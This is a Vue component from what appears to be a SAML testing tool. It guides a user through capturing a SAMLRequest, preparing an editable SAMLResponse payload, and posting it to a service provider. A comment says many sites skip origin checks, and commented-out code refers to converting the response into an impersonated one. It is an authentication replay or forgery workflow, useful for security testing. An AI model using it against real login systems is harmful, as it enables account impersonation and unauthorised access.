<template>
    <v-stepper :items="['Log Out', 'Solicit Login', 'Prepare Payload', 'Submit']">
        <template v-slot:item.1>
            <p>Ensure you have logged out of the Service Provider and Identity Provider, or open an incognito tab.</p>
            <br />
            <p><i>Detected identity provider (Issuer): {{ issuer }}</i></p>
            <p><i>Detected service provider (Audience): {{ audience }}</i></p>
        </template>

        <template v-slot:item.2>
            <p>Head to {{ audience }}, start to login, but do not complete the authentication process. Stop before the Identity Provider (Issuer) responds.</p>
            <br/>
            <p>Copy the <code>SAMLRequest</code> out of the request body.</p>
            <br/>
            <v-textarea label="Paste SAMLRequest" v-model="samlRequest"></v-textarea>
        </template>

        <template v-slot:item.3>
            <v-btn @click="preparePayload" color="primary" block>Prepare New Payload</v-btn>
            <br/>
            <v-textarea label="Prepared Payload - Edit As You Like" v-model="newResponseDecoded"></v-textarea>
        </template>

        <template v-slot:item.4>
            <!-- You might think sites would implement some form of cross-origin protection,
                but many implementations just disable origin checking
                (a mitigation could be to limit to just the issuer origin).-->
            <form method="post" target="blank" :action="destination">
                <input type="hidden" name="SAMLResponse" :value="newResponseEncoded" />
                <!-- <input type="hidden" name="RelayState" value="test" /> -->
                <v-btn color="primary" type="submit" block>Submit</v-btn>
            </form>
        </template>
    </v-stepper>
</template>

<script setup>
import Decoder from '@/utils/decoder';
import encode from '@/utils/encoder';
import SamlResponse from '@/utils/samlResponse';


const props = defineProps(['response'])

const samlRequest = ref("")

const newResponseDecoded = ref("")

const audience = computed(() => {
    var parser = new DOMParser();
    var xmlDoc = parser.parseFromString(props.response, "text/xml");
    var response = new SamlResponse(xmlDoc);
    return response.getAudience();
})

const issuer = computed(() => {
    var parser = new DOMParser();
    var xmlDoc = parser.parseFromString(props.response, "text/xml");
    var response = new SamlResponse(xmlDoc);
    return response.getIssuer();
})

const destination = computed(() => {
    var parser = new DOMParser();
    var xmlDoc = parser.parseFromString(props.response, "text/xml");
    var response = new SamlResponse(xmlDoc);
    return response.getDestination();
})

const newResponseEncoded = computed(() => {
    return encode(newResponseDecoded.value)
})

const preparePayload = () => {
    var parser = new DOMParser();
    var xmlDoc = parser.parseFromString(props.response, "text/xml");
    var response = new SamlResponse(xmlDoc);
    newResponseDecoded.value = response.toString()

    // var samlRequestDecoded = new Decoder(samlRequest.value).uriDecode().base64Decode().inflate().utf8Parse();
    // var xmlDoc = parser.parseFromString(samlRequestDecoded.toString(), "text/xml");
    // var newId = xmlDoc.getElementsByTagName("samlp:AuthnRequest")[0].getAttribute("ID")

    // newResponseDecoded.value = response.convertToImpersonated(newId).toString()
}


</script>